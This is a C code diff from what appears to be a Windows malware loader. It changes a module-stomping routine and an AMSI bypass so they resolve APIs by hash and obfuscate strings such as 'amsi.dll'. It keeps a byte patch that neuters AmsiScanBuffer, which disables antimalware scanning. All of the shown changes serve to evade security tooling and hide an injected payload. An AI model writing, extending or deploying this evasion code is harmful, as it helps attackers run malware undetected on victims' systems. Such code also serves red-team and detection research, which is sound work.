@@ -65,7 +65,10 @@ static void ThreadlessExecute(PVOID pPayload) {
 // =============================================================================
 
 static BOOL ModuleStompRobust(LPCWSTR targetDll, SIZE_T payloadSize, PSTOMP_CONTEXT ctx) {
-    HMODULE hModule = LoadLibraryW(targetDll);
+    PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
+    typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
+    LoadLibraryW_t pLoadLibraryW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
+    HMODULE hModule = pLoadLibraryW(targetDll);
     if (!hModule) return FALSE;
     
     ctx->BaseAddress = (PVOID)hModule;
@@ -75,7 +78,7 @@ static BOOL ModuleStompRobust(LPCWSTR targetDll, SIZE_T payloadSize, PSTOMP_CONT
     
     PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
     for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
-        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
+        if (memcmp(pSection[i].Name, STOBFS_A(".text"), 5) == 0) {
             ctx->TextSection = &pSection[i];
             ctx->RegionSize = pSection[i].Misc.VirtualSize;
             break;
@@ -114,10 +117,15 @@ static BOOL BypassAMSI_DataOnlyRobust() {
         pEntry = pEntry->Flink;
     }
     
-    if (!hAmsi) hAmsi = LoadLibraryW(L"amsi.dll");
+    if (!hAmsi) {
+        PVOID hKernel32 = GetModuleBaseByHash(HASH_KERNEL32);
+        typedef HMODULE (WINAPI *LoadLibraryW_t)(LPCWSTR);
+        LoadLibraryW_t pLoadLibraryW = (LoadLibraryW_t)ResolveApiByHash(hKernel32, HASH_LoadLibraryW);
+        hAmsi = pLoadLibraryW(STOBFS_W(L"amsi.dll"));
+    }
     if (!hAmsi) return FALSE;
     
-    PVOID pAmsiScanBuffer = (PVOID)GetProcAddress((HMODULE)hAmsi, "AmsiScanBuffer");
+    PVOID pAmsiScanBuffer = ResolveApiByHash(hAmsi, HASH_AmsiScanBuffer);
     if (pAmsiScanBuffer) {
         BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; 
         ULONG oldProtect = 0;
